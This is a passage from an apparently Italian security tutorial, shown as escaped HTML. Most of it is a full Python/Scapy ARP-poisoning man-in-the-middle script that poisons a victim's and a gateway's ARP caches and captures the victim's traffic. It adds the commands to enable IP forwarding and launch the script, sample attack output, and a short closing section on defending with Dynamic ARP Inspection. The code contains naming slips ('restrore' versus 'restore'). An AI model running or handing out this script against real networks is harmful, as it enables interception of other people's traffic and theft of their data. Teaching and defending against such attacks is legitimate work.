&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;restrore&lt;/span&gt;(self):
        print(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Restoring ARP Tables...&amp;#39;&lt;/span&gt;)
        send(ARP(
            op&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;, 
            psrc&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;gateway, 
            hwsrc&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;gatewaymac, 
            pdst&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;victim, 
            hwdst&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;ff:ff:ff:ff:ff:ff&amp;#39;&lt;/span&gt;), 
            count&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;)
        send(ARP(
            op&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;, 
            psrc&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;victim, 
            hwsrc&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;victimmac, 
            pdst&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;gateway, 
            hwdst&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;ff:ff:ff:ff:ff:ff&amp;#39;&lt;/span&gt;), 
            count&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Il metodo &lt;strong&gt;restore&lt;/strong&gt; potrebbe essere chiamato sia da &lt;strong&gt;poison&lt;/strong&gt; (dopo un CTRL-C), sia da &lt;strong&gt;sniff&lt;/strong&gt; (quando il numero di pacchetti richiesti è stato catturato) e si occupa di inviare i valori originali per gli indirizzi IP e MAC del gateway alla vittima, e viceversa, restituisce i corretti IP e MAC della vittima al gateway.&lt;/p&gt;
&lt;p&gt;Ecco il codice completo:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; multiprocessing &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; Process
&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; scapy.all &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; (ARP, Ether, conf, get_if_hwaddr, send, sniff, sndrcv, srp, wrpcap)

&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; os&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt; sys&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt; time

&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;get_mac&lt;/span&gt;(targetip):
    packet &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; Ether(dst&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;ff:ff:ff:ff:ff:ff&amp;#39;&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;ARP(op&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;who-has&amp;#34;&lt;/span&gt;, pdst&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;targetip)
    resp, _ &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; srp(packet, timeout&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;, retry&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;, verbose&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;False&lt;/span&gt;)
    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; _, r &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; resp:
        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; r[Ether]&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;src
    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;None&lt;/span&gt;

&lt;span style=&#34;color:#66d9ef&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;Arper&lt;/span&gt;:
    &lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; __init__(self, victim, gateway, interface&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;eth0&amp;#39;&lt;/span&gt;):
        self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;victim &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; victim
        self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;victimmac &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; get_mac(victim)
        self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;gateway &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; gateway
        self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;gatewaymac &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; get_mac(gateway)
        self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;interface &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; interface
        conf&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;iface &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; interface
        conf&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;verb &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
        print(&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Initialized &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;interface&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;:&amp;#39;&lt;/span&gt;)
        print(&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Gateway (&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;gateway&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;) is at &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;gatewaymac&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;.&amp;#39;&lt;/span&gt;)
        print(&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Victim (&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;victim&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;) is at &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;victimmac&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;.&amp;#39;&lt;/span&gt;)
        print(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;-&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;30&lt;/span&gt;)
        
    &lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;run&lt;/span&gt;(self):
        self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;poison_thread &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; Process(target&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;poison)
        self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;poison_thread&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;start()

        self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sniff_thread &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; Process(target&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sniff)
        self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sniff_thread&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;start()

    &lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;poison&lt;/span&gt;(self):
        poison_victim &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; ARP()
        poison_victim&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;op &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;
        poison_victim&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;psrc &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;gateway
        poison_victim&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;pdst &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;victim
        poison_victim&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;hwdst &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;victimmac
        print(&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;ip src: &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;poison_victim&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;psrc&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;)
        print(&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;ip dst: &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;poison_victim&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;pdst&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;)
        print(&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;mac dst: &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;poison_victim&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;hwdst&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;)
        print(&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;mac src: &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;poison_victim&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;hwsrc&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;)
        print(poison_victim&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;summary())
        print(&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;-&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;30&lt;/span&gt;)
        poison_gateway &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; ARP()
        poison_gateway&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;op &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;
        poison_gateway&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;psrc &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;victim
        poison_gateway&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;pdst &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;gateway
        poison_gateway&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;hwdst &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;gatewaymac

        print(&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;ip src: &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;poison_gateway&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;psrc&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;)
        print(&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;ip dst: &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;poison_gateway&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;pdst&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;)
        print(&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;mac dst: &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;poison_gateway&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;hwdst&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;)
        print(&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;mac src: &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;poison_gateway&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;hwsrc&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;)
        print(poison_gateway&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;summary())
        print(&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;-&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;30&lt;/span&gt;)
        print(&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Beginning the ARP poison. [CTRL-C to stop]&amp;#39;&lt;/span&gt;)
        &lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;True&lt;/span&gt;:
            sys&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;stdout&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;write(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;.&amp;#39;&lt;/span&gt;)
            sys&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;stdout&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;flush()
            &lt;span style=&#34;color:#66d9ef&#34;&gt;try&lt;/span&gt;:
                send(poison_victim)
                send(poison_gateway)
            &lt;span style=&#34;color:#66d9ef&#34;&gt;except&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;KeyboardInterrupt&lt;/span&gt;:
                self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;restore()
                sys&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;exit()
            &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;:
                time&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sleep(&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;)

    &lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;sniff&lt;/span&gt;(self, count&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;100&lt;/span&gt;):
        time&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sleep(&lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;)
        print(&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Sniffing &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;count&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt; packets&amp;#39;&lt;/span&gt;)
        bpf_filter &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;ip host &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;%s&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; victim
        packets &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; sniff(count&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;count, filter&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;bpf_filter, iface&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;interface)
        wrpcap(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;arper.pcap&amp;#39;&lt;/span&gt;, packets)
        print(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Got the packets&amp;#39;&lt;/span&gt;)
        self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;restrore()
        self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;poison_thread&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;terminate()
        print(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Finished.&amp;#39;&lt;/span&gt;)
        
    &lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;restrore&lt;/span&gt;(self):
        print(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Restoring ARP Tables...&amp;#39;&lt;/span&gt;)
        send(ARP(
            op&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;, 
            psrc&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;gateway, 
            hwsrc&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;gatewaymac, 
            pdst&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;victim, 
            hwdst&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;ff:ff:ff:ff:ff:ff&amp;#39;&lt;/span&gt;), 
            count&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;)
        send(ARP(
            op&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;, 
            psrc&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;victim, 
            hwsrc&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;victimmac, 
            pdst&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;gateway, 
            hwdst&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;ff:ff:ff:ff:ff:ff&amp;#39;&lt;/span&gt;), 
            count&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;)

&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; __name__ &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;__main__&amp;#34;&lt;/span&gt;:
    (victim, gateway, interface) &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (sys&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;argv[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;], sys&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;argv[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;], sys&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;argv[&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;])
    myarp &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; Arper(victim, gateway, interface)
    myarp&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;run()
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Prima di avviare l’attacco dobbiamo informare la macchina host locale che possiamo inoltrare pacchetti sia attraverso il gateway sia attraverso il nostro obiettivo. Su Kali digitiamo il comando:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;sudo echo &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; &amp;gt; /proc/sys/net/ipv4/ip_forward
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Ora che l’IP forwarding è stato importato, avviamo lo script con:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;sudo python3 arper.py &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;IP vittima&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;IP gateway&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;interface&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Ad esempio:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;sudo python3 arper.py 192.168.1.22 192.168.1.1 wlp61s0
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;L’output durante l’attacco:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;? &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;192.168.1.1&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; associato a 18:cc:18:fa:ad:b1 &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;ether&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; su wlp61s0
? &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;192.168.1.176&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; associato a 18:cc:18:fa:ad:b1 &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;ether&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; su wlp61s0
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Si vede che la vittima malcapitata ha una cache ARP compromessa, poichè il gateway risulta avere lo stesso indirizzo MAC dell’attaccante: infatti noi stiamo attaccando dal 192.168.1.176. A fine attacco, dovresti avere un file di nome arper.pcap nella stessa directory dello script.&lt;/p&gt;
&lt;h1 id=&#34;come-prevenire-larp-poisoning-con-dai&#34;&gt;Come prevenire L&amp;rsquo;ARP Poisoning con DAI&lt;/h1&gt;
&lt;p&gt;L&amp;rsquo;ispezione ARP dinamica (DAI) è una funzione di sicurezza che rifiuta i pacchetti ARP non validi e dannosi.  La funzione impedisce una classe di attacchi man-in-the-middle, in cui una stazione ostile intercetta il traffico per altre stazioni avvelenando le cache ARP dei suoi ignari vicini.  Il malintenzionato invia richieste o risposte ARP mappando l&amp;rsquo;indirizzo IP di un&amp;rsquo;altra stazione al proprio indirizzo MAC.&lt;/p&gt;
&lt;p&gt;DAI si basa sullo snooping DHCP.  Lo snooping DHCP ascolta gli scambi di messaggi DHCP e crea un database di associazioni di tuple valide (indirizzo MAC, indirizzo IP, interfaccia VLAN).&lt;/p&gt;
